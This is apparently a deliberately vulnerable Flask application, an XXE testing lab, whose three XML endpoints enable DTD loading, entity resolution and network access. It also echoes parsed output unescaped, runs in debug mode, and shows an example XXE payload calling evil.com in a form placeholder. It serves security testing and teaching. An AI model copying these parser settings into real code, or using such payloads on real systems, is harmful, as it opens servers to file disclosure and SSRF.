#!/usr/bin/env python3
"""XXE Lab - Vulnerable XML parser for testing XXE detection.

This intentionally vulnerable application demonstrates XXE vulnerabilities:
- External entity injection with OOB callbacks
- Local file inclusion
- SSRF via XXE

DO NOT deploy this in production!
"""

from flask import Flask, request, jsonify
from lxml import etree
import os

app = Flask(__name__)

BASE_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>XXE Lab</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .container {{ max-width: 800px; margin: 0 auto; }}
        h1 {{ color: #333; }}
        .form {{ margin: 20px 0; }}
        textarea {{ width: 100%; height: 200px; padding: 10px; }}
        button {{ padding: 10px 20px; margin-top: 10px; }}
        .result {{ background: #f5f5f5; padding: 15px; margin: 10px 0; }}
        .error {{ background: #fee; color: #c00; padding: 15px; margin: 10px 0; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>XXE Lab</h1>
        {content}
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    content = """
        <p>This application contains intentional XXE vulnerabilities for testing.</p>
        <h2>Endpoints:</h2>
        <ul>
            <li><a href="/">Home</a> - This page</li>
            <li><a href="/parse">Parse XML</a> - Vulnerable XML parser</li>
            <li><a href="/upload">Upload XML</a> - File upload with XXE</li>
        </ul>
        <h2>XXE Testing Lab</h2>
        <p>This lab contains intentional XXE vulnerabilities:</p>
        <ul>
            <li>External entity injection</li>
            <li>Local file inclusion</li>
            <li>SSRF via XXE</li>
        </ul>
        <p>Try submitting XML with external entities to /parse or /upload</p>
    """
    return BASE_TEMPLATE.replace('{content}', content)


@app.route('/parse', methods=['GET', 'POST'])
def parse_xml():
    """VULNERABLE: XXE via XML parsing without secure settings"""
    if request.method == 'GET':
        content = """
            <h2>Parse XML</h2>
            <form method="POST">
                <div class="form">
                    <label>XML Content:</label>
                    <textarea name="xml" placeholder='<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://evil.com/xxe">
]>
<foo>&xxe;</foo>'></textarea>
                </div>
                <button type="submit">Parse XML</button>
            </form>
        """
        return BASE_TEMPLATE.replace('{content}', content)
    
    # VULNERABLE: Parse XML without disabling external entities
    xml_data = request.form.get('xml', '') or request.get_data(as_text=True)
    
    if not xml_data:
        return jsonify({"error": "No XML provided"}), 400
    
    try:
        # VULNERABLE: Enable DTD and external entity resolution
        parser = etree.XMLParser(
            resolve_entities=True,
            load_dtd=True,
            no_network=False  # Allow network access for external entities
        )
        root = etree.fromstring(xml_data.encode(), parser)
        
        # Extract text content
        result_text = etree.tostring(root, encoding='unicode', pretty_print=True)
        
        content = f"""
            <h2>Parsed XML</h2>
            <div class="result">
                <h3>Result:</h3>
                <pre>{result_text}</pre>
            </div>
            <p><a href="/parse">Parse another XML</a></p>
        """
        return BASE_TEMPLATE.replace('{content}', content)
    except Exception as e:
        error_content = f"""
            <h2>Parse Error</h2>
            <div class="error">
                <strong>Error:</strong> {str(e)}
            </div>
            <p><a href="/parse">Try again</a></p>
        """
        return BASE_TEMPLATE.replace('{content}', error_content)


@app.route('/upload', methods=['GET', 'POST'])
def upload_xml():
    """VULNERABLE: XXE via file upload"""
    if request.method == 'GET':
        content = """
            <h2>Upload XML File</h2>
            <form method="POST" enctype="multipart/form-data">
                <div class="form">
                    <label>XML File:</label>
                    <input type="file" name="file" accept=".xml,text/xml">
                </div>
                <button type="submit">Upload and Parse</button>
            </form>
        """
        return BASE_TEMPLATE.replace('{content}', content)
    
    if 'file' not in request.files:
        return jsonify({"error": "No file provided"}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No file selected"}), 400
    
    try:
        xml_data = file.read().decode('utf-8')
        
        # VULNERABLE: Parse uploaded XML with external entity resolution enabled
        parser = etree.XMLParser(
            resolve_entities=True,
            load_dtd=True,
            no_network=False
        )
        root = etree.fromstring(xml_data.encode(), parser)
        
        result_text = etree.tostring(root, encoding='unicode', pretty_print=True)
        
        content = f"""
            <h2>Uploaded XML</h2>
            <div class="result">
                <h3>Parsed Content:</h3>
                <pre>{result_text}</pre>
            </div>
            <p><a href="/upload">Upload another file</a></p>
        """
        return BASE_TEMPLATE.replace('{content}', content)
    except Exception as e:
        error_content = f"""
            <h2>Upload Error</h2>
            <div class="error">
                <strong>Error:</strong> {str(e)}
            </div>
            <p><a href="/upload">Try again</a></p>
        """
        return BASE_TEMPLATE.replace('{content}', error_content)


@app.route('/api/xml', methods=['POST'])
def api_parse_xml():
    """VULNERABLE: API endpoint for XML parsing"""
    xml_data = request.get_data(as_text=True)
    
    if not xml_data:
        return jsonify({"error": "No XML provided"}), 400
    
    try:
        # VULNERABLE: Enable external entity resolution
        parser = etree.XMLParser(
            resolve_entities=True,
            load_dtd=True,
            no_network=False
        )
        root = etree.fromstring(xml_data.encode(), parser)
        
        result = {
            "success": True,
            "parsed": etree.tostring(root, encoding='unicode')
        }
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 400


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)

